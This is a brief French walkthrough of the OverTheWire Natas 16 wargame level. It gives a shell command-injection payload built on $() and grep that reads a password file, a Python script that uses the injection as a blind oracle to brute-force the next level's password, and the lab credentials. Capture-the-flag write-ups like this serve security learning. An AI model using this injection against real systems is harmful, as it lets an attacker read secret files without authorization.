username : natas16
password : hPkjKYviLQctEW33QmuXL6eDVfMW4sGo

- On arrive sur un dictionaire.txt 
- Certains caracteres sont bloqués mais pas le $() qui permets d'executer du code shell.
- On va tester ca : `$(grep -E ^a.* /etc/natas_webpass/natas17)test`
- On a un retour positif. On va donc construire notre mot de passe ainsi :
	1) On test pour tous les caracteres si on a une reponse valide alors on ajoute au mdp et on test pour le mdp actuel + les autres caractères.

Script python : 
```python 
import requests
import string

url = "http://natas16.natas.labs.overthewire.org/"
auth = ('natas16', 'mot_de_passe_du_niveau_precedent')
chars = string.ascii_letters + string.digits

password = ""
while len(password) < 32:
    for char in chars:
        payload = f'hackers$(grep ^{password}{char} /etc/natas_webpass/natas17)'
        r = requests.get(url, auth=auth, params={'needle': payload})
        if 'hackers' not in r.text:
            password += char
            print(f"Mot de passe trouvé jusqu'à présent : {password}")
            break
    else:
        print(f"Mot de passe complet : {password}")
        break

print(f"Mot de passe final : {password}")
```
- On lance le script 
- Notre Mot de passe se construit 
-> Mot de passe : **EqjHJbo7LFNb8vwhHb9s75hokh5TF0OC** 
